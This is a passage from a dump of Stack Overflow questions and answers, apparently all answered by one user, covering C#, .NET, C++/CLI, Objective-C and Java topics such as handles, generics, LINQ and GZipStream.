","33708","","<p>In C++/CLI, a handle is a pointer to an object located on the GC heap. Creating an object on the (unmanaged) C++ heap is achieved using <code>new</code> and the result of a <code>new</code> expression is a ""normal"" pointer. A managed object is allocated on the GC (managed) heap with a <code>gcnew</code> expression. The result will be a handle. You can't do pointer arithmetic on handles. You don't free handles. The GC will take care of them. Also, the GC is free to relocate objects on the managed heap and update the handles to point to the new locations while the program is running.</p>
"
"<p>MSDN docs state ""An expression is a fragment of code that can be evaluated to a single value, object, method, or namespace.""</p>

<p>Could someone please explain what it means for an expression to evaluate to a namespace - how can that be?</p>

<p>edit: fixed typo</p>
","33708","","<p>This is how the grammar is defined. Look at:</p>

<pre><code>System.String
</code></pre>

<p>is an expression containing a dot operator that operates on a couple different expressions. <code>System</code> alone is considered an expression. An expression can be as simple as a single identifier or literal (hint: it's defined recursively.)</p>

<blockquote>
  <h3>Expressions (C# 3.5 spec section Â§7.1: Expression classifications)</h3>
  
  <p>An expression is classified as one of the following:<br />
  ...<br />
  A namespace. An expression with this classification can only appear as the left hand side of a member-access (Â§7.5.4). In any other context, an expression classified as a namespace causes a compile-time error.</p>
</blockquote>

<p>Not being able to use it as, say, an argument to a method doesn't disqualify it as being considered an expression.</p>
"
"<p>Two questions about attributes:</p>

<ol>
<li>When are attribute classes instantiated? When the type is first accessed, or at the start of execution?</li>
<li>From within the attribute class, can I find out for which type the attribute was instantiated?</li>
</ol>

<p>The idea is that I want to make a list of all the classes in my assembly that have my attribute applied to it. I could of course iterate through all of them with reflection and check - but it would be nicer if the attribute could simply append to a global static list upon instantiation.</p>
","33708","","<p>Attributes are <strong>not</strong> automatically instantiated upon application startup. The only way to see which types (or any IL element, for that matter) has the attribute applied is to iterate everything and check one by one. Consequently, attributes can't automatically take control of a program.</p>

<p>They are basically metadata attached to some stuff. Their constructor is called when reflection instantiates the attribute class that represents the attribute at run time. This happens only when you request reflection to do so (by <code>Type.GetCustomAttributes</code> method.) </p>
"
"<p>When i make iteration over the following declaration  :</p>

<p>Car[] cars = new Car[2];
<br/>
cars[0] = new Car { Speed = 100, Color = ""green"" };
<br/>
cars[1] = new Car { Speed = 200, Color = ""Orange"" };
<br/></p>

<p><b> <i> using ""foreach"" i have no issue to iterate over the Car Array </i> </b>
<br/></p>

<p>but as in the case of following :
<br/></p>

<p><strong>public class CarStore:Car</strong>
    {
<br/>
        Car[] m_collection = new Car[2];</p>

<pre><code>    public CarStore()
    {
        m_collection[1] = new Car { Speed = 100, Color = ""red"" };
        m_collection[2] = new Car { Speed = 200, Color = ""yellow"" };
    }

}
</code></pre>

<p><br/>
Now i suppose to Use :</p>

<p>CarStore m_Store = new CarStore();
<br/></p>

<p>foreach (Car myCar in m_Store),iteration won't work until i use IEnumerator
<hr/>
My Question is :
<br/></p>

<ol>
<li> How does CLR internally treat them? .First case it use System.Array,What happen 
      to second case of declaration ..?
</li>

<li> Am i really unfit for coding in OOps world ?,for not  knowing such basic things? </li>

</ol>
","33708","","<p><code>foreach</code> can't magically infer that you are building an enumerable collection. What it does is to see if it can call a <code>GetEnumerator</code> method that returns an <code>IEnumerator</code>. If it can't call such a method, the compiler will complain.</p>

<p>You'll have to provide a <code>GetEnumerator</code> implementation if you want to be able to use <code>foreach</code> on your own object:</p>

<pre><code>public IEnumerable&lt;Car&gt; GetEnumerator() {
    foreach(Car c in m_collection) // btw, don't use `s_`, `m_`, `g_` prefixes
        yield return c;
}
</code></pre>
"
"<p>Which is a better practice?  (I'm coding in .Net if that makes a difference)</p>

<pre><code>IF condition = true THEN
   ...true action--even if rare...
ELSE
   ...action
END IF
</code></pre>

<p>or</p>

<pre><code>IF condition = [most common condition] THEN
   ...most common action....
ELSE
   ...least common action
END IF
</code></pre>
","33708","","<p>Go with the most readable version for your specific case, and by the way, don't compare a boolean expression to true and false. Use <code>condition</code> and <code>Not condition</code> (<code>!condition</code> in C#.)</p>

<pre><code>if (condition == true) // bad
if (condition) // better
</code></pre>
"
"<p>For those of you that use the underscore prefix for private class members in C# (i.e. private int _count;), what do you use for private constants?  I'm thinking the following but am curious as to what others are doing.</p>

<pre><code>private const int _MaxCount;
</code></pre>
","33708","","<p>C# and .NET naming conventions discourage all prefixes (e.g. <code>C</code>, <code>i</code>, <code>s_</code>, <code>g_</code>, <code>m_</code>, <code>_</code>) except ""<code>I</code>"" for interface names and ""<code>T</code>"" for type parameters.</p>
"
"<p>Developing for iphone os 3.0 and 3.0.1 make some difference or not?</p>
","33708","","<p>I believe there's no difference for developers. They just fixed the SMS bug. Most of the binaries are identical.</p>
"
"<p>In WCF services and a variety of other .NET apps, I understand that app.config is used to specify settings.
Is this file only used at compile time and settings get stored in the assembly or is it required at run time as well?
Does it vary per project type?</p>
","33708","","<p>It's a run time thing. There are a bunch of APIs in the <code>System.Configuration</code> namespace that can be used to read settings from application configuration file (<code>Web.config</code> in Web apps, <code>assembly.exe.config</code> in others.)</p>
"
"<p>I see this quiet often in C# documentation. But what does it do?</p>

<pre><code>public class Car
{
   public Name { get; set; }
}
</code></pre>
","33708","","<p>It's an automatic read-write property. It's a C# 3.0 addition. Something like:</p>

<pre><code>public class Car {
    private string name;
    public string Name { get { return name; } set { name = value; } }
}
</code></pre>

<p>except that you can't directly access the backing field.</p>
"
"<p>If i declare</p>

<pre><code>[Flags]
public enum MyColor
{
    Red = 1;
    Green = 2;
    Blue = 4;
    White = 8;
    Magenta = 16;
    ... (etc)
}
</code></pre>

<p>Is there a way to determine/set the number of Bytes that this enum takes up?  Also, what byte order would it end up in? (e.g. do i have to do a HostToNetwork() to properly send it over the wire?)  Also, in order to call HostToNetwork, can i cast as a byte array and iterate?</p>
","33708","","<pre><code>[Flags]
public enum MyColor : byte // sets the underlying type.
{
    Red = 0;
    Green = 1;
    Blue = 2;
    White = 4;
    Magenta = 8;
    ... (etc)
}
</code></pre>

<p>It's not possible to directly set the endianness. You can use some well-crafted numbers that simulate big-endian bytes on a little endian system. However, I'd always use explicit APIs for converting byte orders.</p>
"
"<p>I'm trying to make a new CLLocation subclass. This is the skeleton:</p>

<pre><code>#import &lt;UIKit/UIKit.h&gt;
#import &lt;CoreLocation/CoreLocation.h&gt;

@interface JFLocation : CLLocation {

}

@end


#import ""JFLocation.h""


@implementation JFLocation

@end
</code></pre>

<p>When I build the class I'm getting this errors:</p>

<pre><code>Undefined symbols:
  "".objc_class_name_CLLocation"", referenced from:
      .objc_class_name_JFLocation in JFLocation.o
ld: symbol(s) not found
</code></pre>

<p>Any Idea?? Thank you!! </p>
","33708","","<p>You should add <code>CoreLocation.framework</code> to the frameworks used by the project.</p>

<p>Right click on ""Frameworks"" in the Xcode project. Click Add <code>&gt;</code> Existing Frameworks...</p>

<p>By default the path should be:</p>

<pre><code>/Developer/Platforms/iPhoneOS.plarform/Developer/SDKs/iPhoneOS3.0.sdk/System/Library/Frameworks/CoreLocation.framework
</code></pre>
"
"<p>Apparently (at least according to <code>gcc -std=c99</code>) C99 doesn't support function overloading.  The reason for not supporting some new feature in C is usually backward compatibility, but in this case I can't think of a single case in which function overloading would break backward compatibility.  What is the reasoning behind not including this basic feature?</p>
","33708","","<p>When you compile a C source, symbol names will remain intact. If you introduce function overloading, you should provide a name mangling technique to prevent name clashes. Consequently, like C++, you'll have machine generated symbol names in the compiled binary.</p>

<p>Also, C does not feature strict typing. Many things are implicitly convertible to each other in C. The complexity of overload resolution rules could introduce confusion in such kind of language.</p>
"
"<p>I am writing some code to generate an opml file from a list of rss feeds (parsed) on my site. The user will select checkboxes from a datagrid of rss feeds on my site, and when pressing a button, the heavy lifting will happen.</p>

<p>Anyway, I have code like this:</p>

<pre><code>     foreach (var v in list)
    {
        XName xname;

        doc.Element(""channel"").Add(
            new XElement(""title"", v.Name),
            new XElement(""description"", ""First Article Description""),
            new XElement(""pubDate"", DateTime.Now.ToUniversalTime()),
            new XElement(""guid"", Guid.NewGuid()));

    }
</code></pre>

<p>list is a collection of feed objects (e.g. hanselman rss feed, codinghorror rss feed, etc). The datagrid will have a checkbox and pressing the button below this grid, the code above will execute (I have also got the code for the xml declarations etc).</p>

<p>When I use the Element(...) method, I need to provide XName. This has an internal constructor which I cannot use. How can I pass this parameter in?</p>
","33708","","<p>Create a <code>XNamespace</code> object and use the addition operator:</p>

<pre><code>XName name = (XNamespace)""http://schemas.xyz.com/namespaceUri"" + ""tagName"";
</code></pre>
"
"<p>How can I provide a user object to every view in ASP.NET MVC without having to create a ViewModel for absolutely every view I have?</p>

<p>When using ASP.NET Membership, I just get a Profile variable in the views with the profile information, but when rolling my own I don't see a way to export that information.</p>
","33708","","<p>Inherit your <code>ViewModel</code> classes from a master <code>ViewModel</code> with a <code>User</code> property.</p>

<p>Alternatively, you can pass the object in <code>ViewData</code> collection and use an extension method to make it easy to access the object in the view.</p>
"
"<p>This might be a very basic question, but I am a bit confused about it.
If I reflect the Int32/Double/any value type code, I see that they are structs and look like :</p>

<pre><code>[Serializable, StructLayout(LayoutKind.Sequential), ComVisible(true)]
public struct Double : IComparable, IFormattable, IConvertible, IComparable&lt;double&gt;, IEquatable&lt;double&gt;
{
....
}
</code></pre>

<p>So, why do we say that everything in .NET is derived from System.Object. I think am missing some crucial point here.</p>

<p><strong>EDIT:</strong>
What confuses me further is that how can a value type which is struct inherit from System.Object which is a class.</p>
","33708","","<p>Eric Lippert has covered this in a blog entry: <a href=""http://blogs.msdn.com/ericlippert/archive/2009/08/06/not-everything-derives-from-object.aspx"">Not everything derives from object</a> (This is the title of the post; not the answer to this question. Don't get confused.)</p>

<p>Yes, all <code>struct</code>s inherit from <code>System.ValueType</code> which in turn inherits from <code>System.Object</code>. <code>enum</code>s you declare inherit from <code>System.Enum</code> which inherits from <code>System.ValueType</code>. </p>

<h3>Update:</h3>

<p>Inherently, there's not a problem with a value type being derived from a reference type. Inheritance is a ""is-a"" relationship between two <em>types</em>. However, in order to treat a value type as an object instance, it has to be boxed. This is done implicitly when you are passing a value to a method that expects an object parameter (or when you call instance methods implemented in <code>System.Object</code>.)</p>
"
"<p>Let's say I have the following code...</p>

<pre><code>StringBuilder sb = new StringBuilder();
for (int i = 0; i &lt; 10000; i++)
{
  MyCustomClass myObj = new MyCustomClass();
  sb.Append(myObj.RenderShortString());
}
Console.Write(sb.ToString());
</code></pre>

<p>And assume that MyCustomClass is a very large object. For example, let's say it creates and holds an internal member containing a 1MB string. The RenderShortString() method simply renders a string about 100 characters in length.</p>

<p>Notice this loops 10000 times.</p>

<p>I have something basically like this which is causing System.OutOfMemory exceptions inside the loop.</p>

<p>My question is related to when the memory space allocated for each instance of myObj is cleaned up by the Garbage collector. I don't think I am having an issue with the StringBuilder, but I may be wrong. I get the feeling that the instances of myObj are getting allocated in memory, but not available for cleanup until after the loop is exited. Is this correct? If so, how can I tell the application that as soon as I get my rendered string, I am done with that instance?</p>
","33708","","<p>Simple answer: You never know. .NET garbage collection is not deterministic. You can force a garbage collection with <code>System.GC.Collect</code> method. Other than that, GC only guarantees the memory allocated to unreachable objects will be freed eventually.</p>
"
"<p>I would like to know: are any <a href=""http://en.wikipedia.org/wiki/Design_Patterns_%28book%29"">GoF</a> design patterns are used in the <a href=""http://en.wikipedia.org/wiki/.NET_Framework"">.NET Framework</a>?</p>

<p><strong>BOUNTY:</strong></p>

<p>I have seen the MSDN link below in an answer. Are there any post/video or can you can list patterns and most importantly WHERE it is used?</p>
","33708","","<p>Definitely. For instance, <em>Factory pattern</em> is used in ADO.NET data provider classes. <em>Singleton pattern</em> is used in .NET remoting. <em>Dispose pattern</em> is used in resource management.</p>
"
"<p>I typically develop in C# and am quite accustom to using System.IO. I recently ran across the FileIO library and have found that some of the advantages (such as sending an item to the recycle bin) are quite nice to have. Especially in the program I am currently working on.
My question is, Does System.IO out perform the VisualBasic.FileIO??</p>

<p>My program I am writing will be copying literally TB's worth of information onto server towers. I want to make sure I do not lose any time due to the library I am using.</p>

<p>Thank you in advance!!!</p>
","33708","","<p><code>Microsoft.VisualBasic.FileIO</code> is built on top of <code>System.IO</code> (for the most part.) It should be at most as fast as <code>System.IO</code> for things that have direct equivalent there. The performance difference should be negligible anyway. Nothing prevents you from using both. If there's a function you need that exists in <code>VisualBasic.FileIO</code> and doesn't exist in <code>System.IO</code>, you should be using the <code>VisualBasic.FileIO</code> version rather than rolling your own.</p>
"
"<p>I have a collection of NSObjects that I want to store in a 2D array generated at run time. In C# I'd just be using some of their friendly generic containers, but not too sure the best way to go about it in objective-c for iphone development. </p>

<p>I'm guessing that NSMutableArray isn't the best route. I don't need the array to grow, I'll know the size I want when my grid manager is created, but the grid will be constructing with a runtime height and width.</p>

<p>Should I be doing something along the lines of 'NSObject** gridObjects = alloc...'?</p>
","33708","","<p>You can always use plain C stuff in Objective-C (I wouldn't suggest doing this unless you have good reasons to):</p>

<pre><code>NSObject** *twoDArray = malloc(sizeof(NSObject**) * rows);
for (i = 0; i &lt; rows; ++i)
    twoDArray[i] = malloc(sizeof(NSObject*) * cols);
</code></pre>

<p>To resize each block, you can use <code>realloc</code> (if you even needed). Don't forget to <code>free</code> after use.</p>
"
"<p>I tried to allocate an array of structs in this way:</p>

<pre><code>struct T {
    int a; int b;
}

data = Marshal.AllocHGlobal(count*Marshal.SizeOf(typeof(T));
...
</code></pre>

<p>I'd like to access to allocated data ""binding"" a struct to each element in array allocated
with AllocHGlobal... something like this</p>

<pre><code>T v;
v = (T)Marshal.PtrToStructure(data+1, typeof(T));
</code></pre>

<p>but i don't find any convenient way... <strong>why IntPtr lack of arithmetics</strong>? How can I workaround this in a ""safe"" way?</p>

<p>Someone could confirm that PtrToStructure function copy data into the struct variable? In other words, modifing the struct reflect modifications in the structure array data, or not?</p>

<p>Definitely, I want to operate on data pointed by an IntPtr using struct, without copying data each time, avoiding unsafe code.</p>

<p>Thank all!</p>
","33708","","<blockquote>
  <p>""Why <code>IntPtr</code> lack of arithmetics?""</p>
</blockquote>

<p><code>IntPtr</code> stores just a memory address. It doesn't have any kind of information about the contents of that memory location. In this manner, it's similar to <code>void*</code>. To enable pointer arithmetic you have to know the size of the object pointed to. </p>

<p><hr /></p>

<p>Fundamentally, <code>IntPtr</code> is primarily designed to be used in managed contexts as an opaque handle (i.e. one that you don't directly dereference in managed code and you just keep around to pass to unmanaged code.) <code>unsafe</code> context provides pointers you can manipulate directly.</p>
"
"<p>My teacher asked us to investigate what an Extension Class was but I can't seem to find anything on MSDN or Google. Any help?</p>
","33708","","<p>There's no such thing as ""extension class"" in formal C# terminology. It might mean a class defining <a href=""http://msdn.microsoft.com/en-us/library/bb383977.aspx"" rel=""nofollow"">extension methods</a> (which is not anything special, it's just a simple <code>static</code> class.)</p>
"
"<p>I have a class in C++/CLI that I'd like to give a property. I want to declare the property in a header file and then implement that property in a .cpp file. </p>

<p>Here's the header:</p>

<pre><code>public ref class Dude
{
    static property Dude^ instance
    {
        Dude^ get();    
    }
}
</code></pre>

<p>If I declare the header file and don't put anything in the cpp, i get the following error:</p>

<pre><code>1&gt;Dude.obj : error LNK2020: unresolved token (06000001) Test.Dude::get_instance
</code></pre>

<p>From this I concluded that I should implement the property as </p>

<pre><code>  static Lock myInstanceLock;

   Dude^ Dude::get_instance()
   {

       if(myInstance == nullptr)
       {
           myInstanceLock.lock();
           if(myInstance == nullptr)
           {
               myInstance = gcnew Dude();
           }
           myInstanceLock.unlock();             
       }
       return myInstance;
   }
</code></pre>

<p>However, when I compile this code, I get a bunch of errors. The first error (The others are a result of the first one) is:</p>

<pre><code>1&gt;.\Dude.cpp(13) : error C2039: 'get_instance' : is not a member of 'Test::Dude'
</code></pre>

<p>Can anyone shed some light on this issue?</p>
","33708","","<p>Change the implementation to:</p>

<pre><code>Dude^ Dude::instance::get()
</code></pre>
"
"<p>Say that i have a <a href=""http://msdn.microsoft.com/en-us/library/3eayzh46.aspx"" rel=""nofollow"">generic dictionary</a> with data like this (I hope the notation is clear here):  </p>

<p>{
   ""param1"" => ""value1"",
   ""param2"" => ""value2"",
   ""param3"" => ""value3""
}</p>

<p>I'm trying to use the <a href=""http://msdn.microsoft.com/en-us/library/bb548651.aspx"" rel=""nofollow"">Enumerable.Aggregate</a> function to fold over each entry in the dictionary and output something like this:</p>

<p>""/param1= value1; /param2=value2; /param3=value3""</p>

<p>If I were aggregating a list, this would be easy. With the dictionary, I'm getting tripped up by the key/value pairs.  </p>
","33708","","<p>You don't need <code>Aggregate</code>:</p>

<pre><code>String.Join(""; "", 
    dic.Select(x =&gt; String.Format(""/{0}={1}"", x.Key, x.Value)).ToArray())
</code></pre>

<p>If you really want to use it:</p>

<pre><code>dic.Aggregate("""", (acc, item) =&gt; (acc == """" ? """" : acc + ""; "") 
                        + String.Format(""/{0}={1}"", item.Key, item.Value))
</code></pre>

<p>Or:</p>

<pre><code>dic.Aggregate("""", 
     (acc, item) =&gt; String.Format(""{0}; /{1}={2}"", acc, item.Key, item.Value), 
     result =&gt; result == """" ? """" : result.Substring(2));
</code></pre>
"
"<p>How would I convert this kind of expression in VB.NET? I'm stomped!</p>

<p><code>bool exists=repo.Exists&lt;Post&gt;(x=&gt;x.Title==""My Title"");</code></p>

<p>This is from the SubSonic docs here: <a href=""http://subsonicproject.com/docs/Using%5FSimpleRepository"" rel=""nofollow"">http://subsonicproject.com/docs/Using_SimpleRepository</a></p>

<p>Thanks in advance!</p>
","33708","","<pre><code>Dim exists = repo.Exists(Of Post)(Function(x) x.Title = ""My Title"")
</code></pre>
"
"<p>for clarity lets say we have students and classes, its a many to many relationship.</p>

<p>I have a Dictionary where the key is the student id and the Enumerable is a collection of classes(say we just have the id ) and I want to revert this to a Dictionary of classId, students</p>

<p>is there a way to do this with Linq? I can think of a way to do this with loops but I m sure there is a way to do this. </p>
","33708","","<pre><code>var newDic = dic
   .SelectMany(pair =&gt; pair.Value
                           .Select(val =&gt; new { Key = val, Value = pair.Key }))
   .GroupBy(item =&gt; item.Key)
   .ToDictionary(gr =&gt; gr.Key, gr =&gt; gr.Select(item =&gt; item.Value));
</code></pre>
"
"<p>I have a public variable ""testStr"" in my applications main form. I have a tabControl which adds tabs loaded with user controls. How can I reference ""testStr"" from these user controls? I would imagine its either Application.* or parentForm.* ... but everything I'm trying isnt working, not really sure how to do it and I'm a bit new to .net... in flex builder i would do something like parentApplication.testStr.</p>

<p>Any help would be appreciated... I'm sure its pretty basic and simple to do.</p>
","33708","","<p>You could save a reference to your form instance in some static variable. For example you could edit <code>Program.cs</code>:</p>

<pre><code>class Program {
     public static MyForm MainForm { get; private set; }
     static void Main() {
         // ...
         Application.Run(MainForm = new MyForm());
         // ...
     }
}
</code></pre>

<p>Then, you could reference the <code>testStr</code> with <code>Program.MainForm.testStr</code>.</p>
"
"<p>I am trying to perform some generic number manipulation independent of the number type. However, I know of no way to use generics to do this. The first idea was to filter the incoming types with a where statement, but all of the number types are closed and are, therefore, not valid for a generic filter. Also, the generics don't allow standard numeric operations (addition, shift, etc), so the only solution I can come up with is to re-write each method non-generically. Any other ideas?</p>

<p>For reference, following is the code that I initially tried:</p>

<pre><code>    private const int BYTE_SIZE = 8;

    private const int UINT16_SIZE = 16;

    private const int UINT32_SIZE = 32;

    private const int UINT64_SIZE = 64;

    public static byte[] ToBytes(UInt16[] pnaValues)
    {
        return ToSmaller&lt;byte, UInt16&gt;(pnaValues, BYTE_SIZE, UINT16_SIZE);
    }

    public static byte[] ToBytes(UInt32[] pnaValues)
    {
        return ToSmaller&lt;byte, UInt32&gt;(pnaValues, BYTE_SIZE, UINT32_SIZE);
    }

    ....

    public static UInt16[] ToUInt16s(byte[] pnaValues)
    {
        return ToLarger&lt;UInt16, byte&gt;(pnaValues, UINT16_SIZE, BYTE_SIZE);
    }

    public static UInt16[] ToUInt16s(UInt32[] pnaValues)
    {
        return ToSmaller&lt;UInt16, UInt32&gt;(pnaValues, UINT16_SIZE, UINT32_SIZE);
    }

    ...

    public static UInt64[] ToUInt64s(UInt32[] pnaValues)
    {
        return ToLarger&lt;UInt64, UInt32&gt;(pnaValues, UINT64_SIZE, UINT32_SIZE);
    }

    private static TLarger[] ToLarger&lt;TLarger, TSmaller&gt;(TSmaller[] pnaSmaller, int pnLargerSize, int pnSmallerSize)
        where TLarger : byte, UInt16, UInt32, UInt64
        where TSmaller : byte, UInt16, UInt32, UInt64
    {
        TLarger[] lnaRetVal = null;
        int lnSmallerPerLarger = pnLargerSize / pnSmallerSize;

        System.Diagnostics.Debug.Assert((pnLargerSize % pnSmallerSize) == 0);

        if (pnaSmaller != null)
        {
            System.Diagnostics.Debug.Assert((pnaSmaller % lnSmallerPerLarger) == 0);

            lnaRetVal = new TLarger[pnaSmaller.Length / lnSmallerPerLarger];

            for (int i = 0; i &lt; lnaRetVal.Length; i++)
            {
                lnaRetVal[i] = 0;

                for (int j = 0; j &lt; lnSmallerPerLarger; j++)
                {
                    lnaRetVal[i] = (lnaRetVal[i] &lt;&lt; pnLargerSize) + pnaSmaller[i * lnSmallerPerLarger + j];
                }
            }
        }

        return lnaRetVal;
    }

    private static TSmaller[] ToSmaller&lt;TSmaller, TLarger&gt;(TLarger[] pnaLarger, int pnSmallerSize, int pnLargerSize)
        where TSmaller : byte, UInt16, UInt32, UInt64
        where TLarger : byte, UInt16, UInt32, UInt64
    {
        TSmaller[] lnaRetVal = null;
        int lnSmallerPerLarger = pnLargerSize / pnSmallerSize;

        System.Diagnostics.Debug.Assert((pnLargerSize % pnSmallerSize) == 0);

        if (pnaSmaller != null)
        {
            lnaRetVal = new TSmaller[pnaLarger.Length * lnSmallerPerLarger];

            for (int i = 0; i &lt; lnaRetVal.Length; i++)
            {
                for (int j = 0; j &lt; lnSmallerPerLarger; j++)
                {
                    lnaRetVal[i * lnSmallerPerLarger + (lnSmallerPerLarger - 1 - j)]
                        = pnaLarger[i] &gt;&gt; (j * pnLargerSize);
                }
            }
        }

        return lnaRetVal;
    }
</code></pre>
","33708","","<p>There's no common interface for arithmetic operations implemented by numeric types. <a href=""http://www.yoda.arachsys.com/csharp/miscutil/usage/genericoperators.html"">Generic operators</a> might help solving your problem.</p>
"
"<p>In C#, when I'm reflecting over a derived type, how come I don't see base classes' static fields?</p>

<p>I've tried both <code>type.GetFields(BindingFlags.Static)</code> and <code>type.GetFields()</code>.</p>
","33708","","<p>This is how it works. <code>static</code> members are really non-object-oriented stuff. They are not polymorphic and they really belong to their declaring type and are unrelated to other types in the inheritance hierarchy. For instance, a static initializer for a base class is not required to run before accessing a static member in a derived class.</p>

<p><code>static</code> members of base classes are not returned unless <code>BindingFlags.FlattenHierarchy</code> is specified:</p>

<pre><code>type.GetFields(BindingFlags.Static 
             | BindingFlags.FlattenHierarchy
             | BindingFlags.Public)
</code></pre>
"
"<p>In the past I have used C++ as a programming language. I know that the code written in C++ goes through a compilation process until it becomes  object code ""machine code"". I would like to know how Java works in that respect. How is the Java code analyzed by the computer? </p>
","33708","","<p>Java uses a two step compilation process. Java source code is compiled down to ""bytecode"" by the Java compiler. The bytecode is executed by Java Virtual Machine (JVM). The current version of Sun HotSpot JVM uses a technique called <a href=""http://en.wikipedia.org/wiki/Just-in-time%5Fcompilation"">Just-in-time (JIT) compilation</a> to compile the bytecode to the native instructions understood by the CPU on the fly at run time.</p>

<p>Some implementations of JVM might interpret the bytecode instead of JIT compiling it to machine code and running it directly. While this is still considered an ""interpreter."" It's significantly different from interpreters that read and execute the high level source code (i.e. in this case, Java source code is not interpreted directly, the bytecode, output of Java compiler, is.) </p>

<p>To summarize, depending on the execution environment, bytecode can be:</p>

<ul>
<li>compiled ahead of time and executed as native code (similar to C++)</li>
<li>compiled just-in-time and executed</li>
<li>interpreted</li>
<li>directly executed by a supported processor (bytecode is the native instruction set of some CPUs)</li>
</ul>
"
"<p>I would like to create a method in a base generic class to return a specialized collection of derived objects and perform some operations on them, like in the following example:</p>

<pre><code>using System;
using System.Collections.Generic;

namespace test {

    class Base&lt;T&gt; {

        public static List&lt;T&gt; DoSomething() {
            List&lt;T&gt; objects = new List&lt;T&gt;();
            // fill the list somehow...
            foreach (T t in objects) {
                if (t.DoSomeTest()) { // error !!!
                    // ...
                }
            }
            return objects;
        }

        public virtual bool DoSomeTest() {
            return true;
        }

    }

    class Derived : Base&lt;Derived&gt; {
        public override bool DoSomeTest() {
            // return a random bool value
            return (0 == new Random().Next() % 2);
        }
    }

    class Program {
        static void Main(string[] args) {
            List&lt;Derived&gt; list = Derived.DoSomething();
        }
    }
}
</code></pre>

<p>My problem is that to do such a thing I would need to specify a constraint like</p>

<pre><code>class Base&lt;T&gt; where T : Base {
}
</code></pre>

<p>Is it possible to specify a constraint like that somehow?</p>
","33708","","<p>This might work for you:</p>

<pre><code>class Base&lt;T&gt; where T : Base&lt;T&gt;
</code></pre>

<p>You can't constrain <code>T</code> to an open generic type. If you need to constrain <code>T</code> to <code>Base&lt;whatever&gt;</code>, you'll need to construct something like:</p>

<pre><code>abstract class Base { }

class Base&lt;T&gt; : Base where T : Base { ... }
</code></pre>
"
"<p>I have to sort ArrayList which consists of objects. Object: ID, Quantity. The ArrayList should be sorted by ID. How to implement this?</p>

<pre><code>ItemIdQuantity = new ItemIdQuantity (ID, Quantity);

ItemIdQuantity.Sort(); // where must be sorting by ID
</code></pre>
","33708","","<pre><code>public class IdComparer : IComparer  {
  int IComparer.Compare(object x, object y) {
      return Compare((ItemIdQuantity)x, (ItemIdQuantity)y);
  }
  public int Compare(ItemIdQuantity x, ItemIdQuantity y) {
      return x.ID - y.ID;
  }
}

arrayList.Sort(new IdComparer());
</code></pre>
"
"<p>I am using a C++ language I am getting a strange error when I am try to create a simple object of DataTable its giving error</p>

<p>System::Data::DataTable* myDataTable = new DataTable();</p>

<p>even I tried this
 System::Data::DataTable myDataTable = new DataTable();
getting the following error please help.</p>

<p>error C2750: 'System::Data::DataTable' : cannot use 'new' on the reference type; use 'gcnew' instead
error C2440: 'initializing' : cannot convert from 'System::Data::DataTable *' to 'System::Data::DataTable ^</p>
","33708","","<p>The language you are using is called <a href=""http://en.wikipedia.org/wiki/C%2B%2B/CLI"">C++/CLI</a>, not plain C++. In <a href=""http://msdn.microsoft.com/en-us/magazine/cc163681.aspx"">C++/CLI</a>, you can access .NET stuff like <code>DataTable</code>. The semantics are a bit different from raw pointers:</p>

<pre><code>DataTable^ myDataTable = gcnew DataTable;
</code></pre>

<p>""<code>^</code>"" denotes a <a href=""http://msdn.microsoft.com/en-us/library/xey702bw.aspx"">managed handle</a>. Under the hood, it's a pointer to an object on the GC heap. You can't do pointer arithmetic on managed handles. You don't <code>delete</code> them manually. The GC will take care of them. It's also free to move the objects around unless they are pinned explicitly. <a href=""http://msdn.microsoft.com/en-us/library/te3ecsc8%28VS.80%29.aspx""><code>gcnew</code></a> is used to allocate objects on the managed heap. It returns a handle, not a raw pointer. You can't create .NET reference types on unmanaged C++ heap using <code>new</code>.</p>
"
"<p>Consider the following statements:</p>

<pre><code>int? v1 = null;

int? v2 = 5 * v1;
</code></pre>

<p>What is the value of  <code>v2</code>? (<code>null</code> or empty string?)</p>

<p>How can I prevent the compiler to mark it as invalid operation? Do I need to follow custom exception handling?</p>
","33708","","<p>It's <code>null</code>.</p>

<blockquote>
  <h3>C# Language Specification 3.0 (Section Â§7.2.7: Lifted operators)</h3>
  
  <p>For the binary operators <code>+</code>  <code>-</code>  <code>*</code>  <code>/</code>  <code>%</code>  <code>&amp;</code>  <code>|</code>  <code>^</code>  <code>&lt;&lt;</code> <code>&gt;&gt;</code> :</p>
  
  <p>a lifted form of an operator exists if the operand and result types are all non-nullable value types. The lifted form is constructed by adding a single <code>?</code> modifier to each operand and result type. <strong>The lifted operator produces a <code>null</code> value if one or both operands are <code>null</code></strong> (an exception being the <code>&amp;</code> and <code>|</code> operators of the <code>bool?</code> type, as described in Â§7.10.3). Otherwise, the lifted operator unwraps the operands, applies the underlying operator, and wraps the result.</p>
</blockquote>

<p><hr /></p>

<blockquote>
  <p>How can I prevent the compiler to mark it as invalid operation? Do I need to follow custom exception handling?</p>
</blockquote>

<p>It's not an invalid operation. It won't throw an exception so you don't need to handle exceptions in this case.</p>
"
"<p>I have a problem when opening a zip file. I am using this code to zip the file:</p>

<pre><code>public static string Zip_File(string soruce , string target)
        {
            try
            {
                byte[] bufferWrite;               
                using (FileStream fsSource = new FileStream(soruce, FileMode.Open, FileAccess.Read, FileShare.Read))
                {
                    bufferWrite = new byte[fsSource.Length];
                    fsSource.Read(bufferWrite, 0, bufferWrite.Length);
                    using (FileStream fsDest = new FileStream(target, FileMode.OpenOrCreate, FileAccess.Write))
                    {
                        using (GZipStream gzCompressed = new GZipStream(fsDest, CompressionMode.Compress, true))
                        {
                            gzCompressed.Write(bufferWrite, 0, bufferWrite.Length);
                            bufferWrite = null;
                            fsSource.Close();
                            gzCompressed.Close();
                            fsDest.Close();
                        }
                    }
                }
                return ""success"";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
</code></pre>

<p>When I call this function am receiving ""success"" message, but I can't able to open the zip file.</p>

<pre><code>ZipFiles.Zip_File(@""C:\Documents and Settings\ccspl\Desktop\IntegrityDVR.mdb"", @""C:\Documents and Settings\ccspl\Desktop\a.zip"")
</code></pre>

<p>This is my function call code:</p>

<p>the compressed(folder) is invalid or corrupted ...> this is error message which I have received</p>
","33708","","<p><code>GZipStream</code> does not create <code>.zip</code> files. It creates <code>.gz</code> files. If you need to create <code>.zip</code> files, you should use something like <a href=""http://www.icsharpcode.net/OpenSource/SharpZipLib/"" rel=""nofollow"">SharpZipLib</a>.</p>
"
"<p>I have two arrays:</p>

<pre><code>string[] Group = { ""A"", null, ""B"", null, ""C"", null };

string[] combination = { ""C#"", ""Java"", null, ""C++"", null }; 
</code></pre>

<p>I wish to return all possible combinations like:</p>

